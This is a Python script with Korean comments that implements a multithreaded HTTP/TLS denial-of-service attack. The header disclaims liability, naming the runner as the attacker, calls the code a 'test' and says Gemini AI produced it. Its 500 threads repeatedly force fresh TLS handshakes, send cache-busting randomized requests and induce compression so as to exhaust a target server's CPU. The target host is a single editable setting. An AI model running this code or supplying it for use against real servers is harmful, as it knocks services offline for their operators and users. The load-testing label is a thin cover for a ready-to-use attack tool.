# 사용으로 인한 피해 및 손실, 법적 피해 보상은 모두 공격자(스크립트 실행자) 에게 있음을 숙지 하였음을 인지한 상태로 실행하십시오.
# 이 코드는 Gemini Ai 로 제작된 코드 입니다.
# 이 코드는 오픈소스 이며 "전혀 피해의 목적" 이 아닌 "테스트" 용도로 만들어 졌습니다.

# stop 을 터미널에 입력하면, 코드의 실행이 중단 됩니다.

import socket
import ssl
import threading
import random
import os
import sys

# --- 설정 정보 ---
target_host = "127.0.0.1"
target_port = 80  # HTTP는 80, HTTPS는 443
threads_count = 500  # CPU 성능에 따라 500까지 늘려보세요.
stop_flag = False


def get_cpu_heavy_payload():
    """서버의 연산을 복잡하게 만드는 페이로드"""
    random_path = "/" + os.urandom(16).hex()  # 매번 새로운 경로
    payload = (
        f"GET {random_path} HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"  # 서버에 압축 연산 강제
        "Connection: keep-alive\r\n"
        "Cache-Control: no-cache, no-store, must-revalidate\r\n"  # 캐시 거부
        "Pragma: no-cache\r\n"
        f"X-Random-ID: {os.urandom(8).hex()}\r\n"  # 헤더 분석 연산 유도
        "\r\n"
    ).encode()
    return payload


def cpu_intensive_attack():
    global stop_flag

    # SSL 설정: 매번 새로운 세션을 맺어 서버가 Session Resume을 못하게 방해
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while not stop_flag:
        try:
            # 1. 새로운 TCP 소켓 생성
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)

            # 2. SSL Handshake 실행 (서버 CPU 소모의 80%가 여기서 발생)
            with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                ssock.connect((target_host, target_port))

                # 3. 여러 번의 요청을 쏟아부어 응답 압축 연산 유도
                for _ in range(5):
                    ssock.sendall(get_cpu_heavy_payload())

                # 서버 응답을 아주 조금만 읽어서 소켓을 유지
                ssock.recv(512)
        except:
            continue


# --- 실행부 ---
print(f"[*] CPU 집중 부하 테스트 시작: {target_host}")
print("[*] 전략: TLS Handshake 반복 + Gzip 압축 유도 + 캐시 무력화")
print("[*] 종료하려면 'stop'을 입력하세요.")

for i in range(threads_count):
    t = threading.Thread(target=cpu_intensive_attack)
    t.daemon = True
    t.start()

while True:
    if sys.stdin.readline().strip().lower() == "stop":
        stop_flag = True
        print("[!] 중단 중... 잠시만 기다려주세요.")
        break

print("[*] 테스트가 종료되었습니다.")